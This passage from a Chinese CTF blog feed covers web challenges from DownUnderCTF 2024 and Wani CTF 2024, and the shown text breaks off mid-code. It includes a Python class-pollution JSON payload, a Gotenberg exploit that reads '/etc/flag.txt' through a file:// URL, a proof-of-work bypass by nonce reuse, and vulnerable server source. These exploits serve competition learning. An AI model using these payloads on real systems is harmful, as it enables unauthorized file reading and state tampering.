class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__class__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;flag&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/DownUnderCTF2024/1720431079833-224d416f-68d0-47a3-a8ff-a2bad81a275b.png"><br><img src="/mdimg/DownUnderCTF2024/1720431063338-aab1189f-2d90-4ce1-a089-9728aba21fa3.png"></p><h2 id="hah-got-em"><a href="#hah-got-em" class="headerlink" title="hah got em"></a>hah got em</h2><p>看附件的dockerfile<br><code>gotenberg/gotenberg:8.0.3</code><br>找历史版本<a href="https://github.com/gotenberg/gotenberg/releases">https://github.com/gotenberg/gotenberg/releases</a><br><img src="/mdimg/DownUnderCTF2024/1720431761406-557161b0-0305-45ba-a4c6-f3db22b0a5fe.png"><br><a href="https://gotenberg.dev/docs/routes#convert-with-chromium">https://gotenberg.dev/docs/routes#convert-with-chromium</a><br> 找到路由<code>/forms/chromium/convert/url</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>URL = <span class="hljs-string">&quot;https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/&quot;</span><br><br>r = requests.post(URL + <span class="hljs-string">&quot;forms/chromium/convert/url&quot;</span>, <br>          files=&#123;<br>            <span class="hljs-string">&#x27;url&#x27;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;file://localhost/etc/flag.txt&#x27;</span>),<br>          &#125;)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.pdf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>f.write(r.content)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wani CTF 2024</title>
    <link href="/2024/06/24/Wani%20CTF%202024/"/>
    <url>/2024/06/24/Wani%20CTF%202024/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Bad-Worker"><a href="#Bad-Worker" class="headerlink" title="Bad_Worker"></a>Bad_Worker</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>url = <span class="hljs-string">&#x27;https://web-bad-worker-lz56g6.wanictf.org/FLAG.txt&#x27;</span><br>r = requests.<span class="hljs-title function_ invoke__">get</span>(url)<br><span class="hljs-keyword">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>FLAG{pr0gr3ssiv3_w3b_4pp_1s_us3fu1}</p><h3 id="POW"><a href="#POW" class="headerlink" title="POW"></a>POW</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;POW Client&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Proof of Work&lt;/h1&gt;<br>    &lt;p&gt;Calculate hashes to get the flag!&lt;/p&gt;<br>    &lt;p&gt;Client status: &lt;span id=<span class="hljs-string">&quot;client-status&quot;</span>&gt;(no status yet)&lt;/span&gt;&lt;/p&gt;<br>    &lt;p&gt;Server response: &lt;span id=<span class="hljs-string">&quot;server-response&quot;</span>&gt;(no hash sent yet)&lt;/span&gt;&lt;/p&gt;<br>    &lt;script<br>      src=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js&quot;</span><br>      integrity=<span class="hljs-string">&quot;sha512-a+SUDuwNzXDvz4XrIcXHuCf089/iJAoN4lmrXJg18XnduKK6YlDHNRalv4yd1N40OKI80tFidF+rqTFKGPoWFQ==&quot;</span><br>      crossorigin=<span class="hljs-string">&quot;anonymous&quot;</span><br>      referrerpolicy=<span class="hljs-string">&quot;no-referrer&quot;</span><br>    &gt;&lt;/script&gt;<br>    &lt;script&gt;<br>       <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hash</span>(<span class="hljs-params">input</span>) </span>&#123;<br>        let result = input;<br>        <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>          result = CryptoJS.<span class="hljs-title function_ invoke__">SHA256</span>(result);<br>        &#125;<br>        <span class="hljs-keyword">return</span> (result.words[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xFFFFFF00</span>) === <span class="hljs-number">0</span>;<br>      &#125;<br>      async <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">send</span>(<span class="hljs-params"><span class="hljs-keyword">array</span></span>) </span>&#123;<br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;server-response&quot;</span>).innerText = await <span class="hljs-title function_ invoke__">fetch</span>(<br>          <span class="hljs-string">&quot;/api/pow&quot;</span>,<br>          &#123;<br>            <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>            <span class="hljs-attr">headers</span>: &#123;<br>              <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>            &#125;,<br>            <span class="hljs-attr">body</span>: JSON.<span class="hljs-title function_ invoke__">stringify</span>(<span class="hljs-keyword">array</span>),<br>          &#125;<br>        ).<span class="hljs-title function_ invoke__">then</span>((r) =&gt; r.<span class="hljs-title function_ invoke__">text</span>());<br>      &#125;<br>      let i = <span class="hljs-title function_ invoke__">BigInt</span>(localStorage.<span class="hljs-title function_ invoke__">getItem</span>(<span class="hljs-string">&quot;pow_progress&quot;</span>) || <span class="hljs-string">&quot;0&quot;</span>);<br>      async <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;<br>        await <span class="hljs-title function_ invoke__">send</span>([]);<br>        async <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loop</span>(<span class="hljs-params"></span>) </span>&#123;<br>          document.<span class="hljs-title function_ invoke__">getElementById</span>(<br>            <span class="hljs-string">&quot;client-status&quot;</span><br>          ).innerText = `Checking $&#123;i.<span class="hljs-title function_ invoke__">toString</span>()&#125;...`;<br>          localStorage.<span class="hljs-title function_ invoke__">setItem</span>(<span class="hljs-string">&quot;pow_progress&quot;</span>, i.<span class="hljs-title function_ invoke__">toString</span>());<br>          <span class="hljs-keyword">for</span> (let j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">1000</span>; j++) &#123;<br>            i++;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hash</span>(i.<span class="hljs-title function_ invoke__">toString</span>())) &#123;<br>              await <span class="hljs-title function_ invoke__">send</span>([i.<span class="hljs-title function_ invoke__">toString</span>()]);<br>            &#125;<br>          &#125;<br>          <span class="hljs-title function_ invoke__">requestAnimationFrame</span>(loop);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">loop</span>();<br>      &#125;<br>      <span class="hljs-title function_ invoke__">main</span>();<br>    &lt;/script&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>要找到数字，其SHA-256哈希值经过10次哈希后，其结果的第一个字的高8位都是0 然后发送到api 1000000次验证通过得到flag 一开始以为要找到1000000个<br>其实可以重复发送同一个数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">import hashlib<br><br>def <span class="hljs-title function_ invoke__">hash_n_times</span>(value, n):<br>    hash_value = <span class="hljs-title function_ invoke__">str</span>(value).<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">for</span> _ in <span class="hljs-title function_ invoke__">range</span>(n):<br>        hash_value = hashlib.<span class="hljs-title function_ invoke__">sha256</span>(hash_value).<span class="hljs-title function_ invoke__">digest</span>()<br>    <span class="hljs-keyword">return</span> hash_value<br><br>def <span class="hljs-title function_ invoke__">is_first_word_zero</span>(hash_value):<br>    first_word = <span class="hljs-keyword">int</span>.<span class="hljs-title function_ invoke__">from_bytes</span>(hash_value[:<span class="hljs-number">4</span>], <span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-keyword">return</span> (first_word &amp; <span class="hljs-number">0xFFFFFF00</span>) == <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 遍历1到9999999之间的数字</span><br><span class="hljs-keyword">for</span> number in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000000</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">is_first_word_zero</span>(<span class="hljs-title function_ invoke__">hash_n_times</span>(number, <span class="hljs-number">10</span>)):<br>        <span class="hljs-keyword">print</span>( number)<br>        <span class="hljs-keyword">break</span><br><br>import requests<br>import time<br><br>URL = <span class="hljs-string">&quot;https://web-pow-lz56g6.wanictf.org/&quot;</span><br><br>session = requests.<span class="hljs-title function_ invoke__">session</span>()<br><br><span class="hljs-keyword">for</span> _ in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">20</span>):<br>  res = session.<span class="hljs-title function_ invoke__">post</span>(URL + <span class="hljs-string">&quot;api/pow&quot;</span>, json=[<span class="hljs-title function_ invoke__">str</span>(number)]*<span class="hljs-number">50000</span>)<br>  <span class="hljs-keyword">print</span>(res.content)<br>  time.<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><code>b&#39;FLAG&#123;N0nCE_reusE_i$_FUn&#125;&#39;</code></p><h3 id="One-Day-One-Letter"><a href="#One-Day-One-Letter" class="headerlink" title="One Day One Letter"></a>One Day One Letter</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php">import json<br>import os<br><span class="hljs-keyword">from</span> datetime import datetime<br><span class="hljs-keyword">from</span> http import HTTPStatus<br><span class="hljs-keyword">from</span> http.server import BaseHTTPRequestHandler, HTTPServer<br><span class="hljs-keyword">from</span> urllib.request import Request, urlopen<br><span class="hljs-keyword">from</span> urllib.parse import urljoin<br><br><span class="hljs-keyword">from</span> Crypto.Hash import SHA256  <span class="hljs-comment"># 导入SHA256哈希函数</span><br><span class="hljs-keyword">from</span> Crypto.PublicKey import ECC  <span class="hljs-comment"># 导入ECC公钥</span><br><span class="hljs-keyword">from</span> Crypto.Signature import DSS  <span class="hljs-comment"># 导入DSS签名方案</span><br><br><span class="hljs-comment"># 从环境变量中获取FLAG_CONTENT，如果没有则默认值为&#x27;abcdefghijkl&#x27;</span><br>FLAG_CONTENT = os.environ.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;FLAG_CONTENT&#x27;</span>, <span class="hljs-string">&#x27;abcdefghijkl&#x27;</span>)<br><span class="hljs-comment"># 确认FLAG_CONTENT长度为12</span><br>assert <span class="hljs-title function_ invoke__">len</span>(FLAG_CONTENT) == <span class="hljs-number">12</span><br><span class="hljs-comment"># 确认FLAG_CONTENT只包含小写字母</span><br>assert <span class="hljs-title function_ invoke__">all</span>(c in <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span> <span class="hljs-keyword">for</span> c in FLAG_CONTENT)<br><br><span class="hljs-comment"># 获取时间服务器的公钥</span><br>def <span class="hljs-title function_ invoke__">get_pubkey_of_timeserver</span>(<span class="hljs-attr">timeserver</span>: str):<br>    req = <span class="hljs-title function_ invoke__">Request</span>(<span class="hljs-title function_ invoke__">urljoin</span>(<span class="hljs-string">&#x27;https://&#x27;</span> + timeserver, <span class="hljs-string">&#x27;pubkey&#x27;</span>))  <span class="hljs-comment"># 构建请求以获取公钥</span><br>    with <span class="hljs-title function_ invoke__">urlopen</span>(req) <span class="hljs-keyword">as</span> res:<br>        key_text = res.<span class="hljs-title function_ invoke__">read</span>().<span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># 读取并解码公钥文本</span><br>        <span class="hljs-keyword">return</span> ECC.<span class="hljs-title function_ invoke__">import_key</span>(key_text)  <span class="hljs-comment"># 导入并返回ECC公钥</span><br><br><span class="hljs-comment"># 根据时间戳生成flag提示</span><br>def <span class="hljs-title function_ invoke__">get_flag_hint_from_timestamp</span>(<span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">int</span>):<br>    content = [<span class="hljs-string">&#x27;?&#x27;</span>] * <span class="hljs-number">12</span>  <span class="hljs-comment"># 初始化提示内容为12个问号</span><br>    idx = timestamp <span class="hljs-comment">// (60*60*24) % 12  # 计算当前时间对应的flag位置</span><br>    content[idx] = FLAG_CONTENT[idx]  <span class="hljs-comment"># 将对应位置的字符填入提示内容</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;FLAG&#123;&#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(content) + <span class="hljs-string">&#x27;&#125;&#x27;</span>  <span class="hljs-comment"># 返回格式化的flag提示</span><br><br><span class="hljs-comment"># 定义HTTP请求处理程序类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HTTPRequestHandler</span>(<span class="hljs-title">BaseHTTPRequestHandler</span>):</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">do_OPTIONS</span>(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        # 处理<span class="hljs-title">OPTIONS</span>请求，用于跨域请求的预检</span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">send_response</span>(200, &quot;<span class="hljs-title">ok</span>&quot;)</span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&#x27;<span class="hljs-title">Access</span>-<span class="hljs-title">Control</span>-<span class="hljs-title">Allow</span>-<span class="hljs-title">Origin</span>&#x27;, &#x27;*&#x27;)</span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&#x27;<span class="hljs-title">Access</span>-<span class="hljs-title">Control</span>-<span class="hljs-title">Allow</span>-<span class="hljs-title">Methods</span>&#x27;, &#x27;<span class="hljs-title">POST</span>, <span class="hljs-title">OPTIONS</span>&#x27;)</span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&quot;<span class="hljs-title">Access</span>-<span class="hljs-title">Control</span>-<span class="hljs-title">Allow</span>-<span class="hljs-title">Headers</span>&quot;, &quot;<span class="hljs-title">X</span>-<span class="hljs-title">Requested</span>-<span class="hljs-title">With</span>&quot;)</span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&quot;<span class="hljs-title">Access</span>-<span class="hljs-title">Control</span>-<span class="hljs-title">Allow</span>-<span class="hljs-title">Headers</span>&quot;, &quot;<span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>&quot;)</span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">end_headers</span>()</span><br><span class="hljs-class"></span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">do_POST</span>(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        <span class="hljs-title">try</span>:</span><br><span class="hljs-class">            <span class="hljs-title">nbytes</span> = <span class="hljs-title">int</span>(<span class="hljs-title">self</span>.<span class="hljs-title">headers</span>.<span class="hljs-title">get</span>(&#x27;<span class="hljs-title">content</span>-<span class="hljs-title">length</span>&#x27;))  # 获取请求体的长度</span><br><span class="hljs-class">            <span class="hljs-title">body</span> = <span class="hljs-title">json</span>.<span class="hljs-title">loads</span>(<span class="hljs-title">self</span>.<span class="hljs-title">rfile</span>.<span class="hljs-title">read</span>(<span class="hljs-title">nbytes</span>).<span class="hljs-title">decode</span>(&#x27;<span class="hljs-title">utf</span>-8&#x27;))  # 读取并解析<span class="hljs-title">JSON</span>请求体</span><br><span class="hljs-class"></span><br><span class="hljs-class">            <span class="hljs-title">timestamp</span> = <span class="hljs-title">body</span>[&#x27;<span class="hljs-title">timestamp</span>&#x27;].<span class="hljs-title">encode</span>(&#x27;<span class="hljs-title">utf</span>-8&#x27;)  # 获取并编码时间戳</span><br><span class="hljs-class">            <span class="hljs-title">signature</span> = <span class="hljs-title">bytes</span>.<span class="hljs-title">fromhex</span>(<span class="hljs-title">body</span>[&#x27;<span class="hljs-title">signature</span>&#x27;])  # 将签名从十六进制转换为字节</span><br><span class="hljs-class">            <span class="hljs-title">timeserver</span> = <span class="hljs-title">body</span>[&#x27;<span class="hljs-title">timeserver</span>&#x27;]  # 获取时间服务器地址</span><br><span class="hljs-class"></span><br><span class="hljs-class">            <span class="hljs-title">pubkey</span> = <span class="hljs-title">get_pubkey_of_timeserver</span>(<span class="hljs-title">timeserver</span>)  # 获取时间服务器的公钥</span><br><span class="hljs-class">            <span class="hljs-title">h</span> = <span class="hljs-title">SHA256</span>.<span class="hljs-title">new</span>(<span class="hljs-title">timestamp</span>)  # 计算时间戳的<span class="hljs-title">SHA256</span>哈希值</span><br><span class="hljs-class">            <span class="hljs-title">verifier</span> = <span class="hljs-title">DSS</span>.<span class="hljs-title">new</span>(<span class="hljs-title">pubkey</span>, &#x27;<span class="hljs-title">fips</span>-186-3&#x27;)  # 创建<span class="hljs-title">DSS</span>验证器</span><br><span class="hljs-class">            <span class="hljs-title">verifier</span>.<span class="hljs-title">verify</span>(<span class="hljs-title">h</span>, <span class="hljs-title">signature</span>)  # 验证签名</span><br><span class="hljs-class"></span><br><span class="hljs-class">            # 如果验证成功，发送响应</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_response</span>(<span class="hljs-title">HTTPStatus</span>.<span class="hljs-title">OK</span>)</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&#x27;<span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>&#x27;, &#x27;<span class="hljs-title">text</span>/<span class="hljs-title">plain</span>; <span class="hljs-title">charset</span>=<span class="hljs-title">utf</span>-8&#x27;)</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&#x27;<span class="hljs-title">Access</span>-<span class="hljs-title">Control</span>-<span class="hljs-title">Allow</span>-<span class="hljs-title">Origin</span>&#x27;, &#x27;*&#x27;)</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">end_headers</span>()</span><br><span class="hljs-class">            <span class="hljs-title">dt</span> = <span class="hljs-title">datetime</span>.<span class="hljs-title">fromtimestamp</span>(<span class="hljs-title">int</span>(<span class="hljs-title">timestamp</span>))  # 将时间戳转换为日期时间对象</span><br><span class="hljs-class">            <span class="hljs-title">res_body</span> = <span class="hljs-title">f</span>&#x27;&#x27;&#x27;&lt;<span class="hljs-title">p</span>&gt;<span class="hljs-title">Current</span> <span class="hljs-title">time</span> <span class="hljs-title">is</span> </span>&#123;dt.<span class="hljs-title function_ invoke__">date</span>()&#125; &#123;dt.<span class="hljs-title function_ invoke__">time</span>()&#125;.&lt;/p&gt;<br>&lt;p&gt;Flag is &#123;<span class="hljs-title function_ invoke__">get_flag_hint_from_timestamp</span>(<span class="hljs-keyword">int</span>(timestamp))&#125;.&lt;/p&gt;<br>&lt;p&gt;You can get only one letter of the flag each day.&lt;/p&gt;<br>&lt;p&gt;See you next day.&lt;/p&gt;<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">            self.wfile.write(res_body.encode(&#x27;</span>utf-<span class="hljs-number">8</span><span class="hljs-string">&#x27;))  # 将响应体写入并发送给客户端</span><br><span class="hljs-string">            self.requestline  # 记录请求行（虽然在此处并没有实际作用）</span><br><span class="hljs-string">        except Exception:</span><br><span class="hljs-string">            # 如果验证失败，发送未授权响应</span><br><span class="hljs-string">            self.send_response(HTTPStatus.UNAUTHORIZED)</span><br><span class="hljs-string">            self.end_headers()</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 创建HTTP服务器实例，绑定到本地地址和端口5000</span><br><span class="hljs-string">handler = HTTPRequestHandler</span><br><span class="hljs-string">httpd = HTTPServer((&#x27;</span><span class="hljs-string">&#x27;, 5000), handler)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 服务器开始运行，开始处理请求</span><br><span class="hljs-string">httpd.serve_forever()</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> http import HTTPStatus<br><span class="hljs-keyword">from</span> http.server import BaseHTTPRequestHandler, HTTPServer<br>import json<br>import time<br><span class="hljs-keyword">from</span> Crypto.Hash import SHA256<br><span class="hljs-keyword">from</span> Crypto.PublicKey import ECC<br><span class="hljs-keyword">from</span> Crypto.Signature import DSS<br><br><span class="hljs-comment"># 生成一个新的ECC密钥对</span><br>key = ECC.<span class="hljs-title function_ invoke__">generate</span>(curve=<span class="hljs-string">&#x27;p256&#x27;</span>)<br><span class="hljs-comment"># 导出公钥，稍后将被提供给客户端进行签名验证</span><br>pubkey = key.<span class="hljs-title function_ invoke__">public_key</span>().<span class="hljs-title function_ invoke__">export_key</span>(format=<span class="hljs-string">&#x27;PEM&#x27;</span>)<br><br><span class="hljs-comment"># 定义HTTP请求处理程序类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HTTPRequestHandler</span>(<span class="hljs-title">BaseHTTPRequestHandler</span>):</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">do_GET</span>(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        <span class="hljs-title">if</span> <span class="hljs-title">self</span>.<span class="hljs-title">path</span> == &#x27;/<span class="hljs-title">pubkey</span>&#x27;:</span><br><span class="hljs-class">            # 处理获取公钥的请求</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_response</span>(<span class="hljs-title">HTTPStatus</span>.<span class="hljs-title">OK</span>)  # 发送<span class="hljs-title">HTTP</span> 200状态码</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&#x27;<span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>&#x27;, &#x27;<span class="hljs-title">text</span>/<span class="hljs-title">plain</span>; <span class="hljs-title">charset</span>=<span class="hljs-title">utf</span>-8&#x27;)  # 设置响应头，内容类型为纯文本</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">send_header</span>(&#x27;<span class="hljs-title">Access</span>-<span class="hljs-title">Control</span>-<span class="hljs-title">Allow</span>-<span class="hljs-title">Origin</span>&#x27;, &#x27;*&#x27;)  # 允许跨域请求</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">end_headers</span>()  # 结束响应头</span><br><span class="hljs-class">            <span class="hljs-title">res_body</span> = <span class="hljs-title">pubkey</span>  # 公钥作为响应体</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">wfile</span>.<span class="hljs-title">write</span>(<span class="hljs-title">res_body</span>.<span class="hljs-title">encode</span>(&#x27;<span class="hljs-title">utf</span>-8&#x27;))  # 将公钥写入响应体并发送给客户端</span><br><span class="hljs-class">            <span class="hljs-title">self</span>.<span class="hljs-title">requestline</span>  # 记录请求行（虽然在此处并没有实际作用）</span><br><span class="hljs-class">        <span class="hljs-title">else</span>:</span><br><span class="hljs-class">            # 处理获取时间戳和签名的请求</span><br><span class="hljs-class">            <span class="hljs-title">timestamp</span> = <span class="hljs-title">str</span>(<span class="hljs-title">int</span>(<span class="hljs-title">time</span>.<span class="hljs-title">time</span>())).<span class="hljs-title">encode</span>(&#x27;<span class="hljs-title">utf</span>-8&#x27;)  # 获取当前时间戳，并编码为字节串</span><br><span class="hljs-class">            <span class="hljs-title">h</span> = <span class="hljs-title">SHA256</span>.<span class="hljs-title">new</span>(<span class="hljs-title">timestamp</span>)  # 使用<span 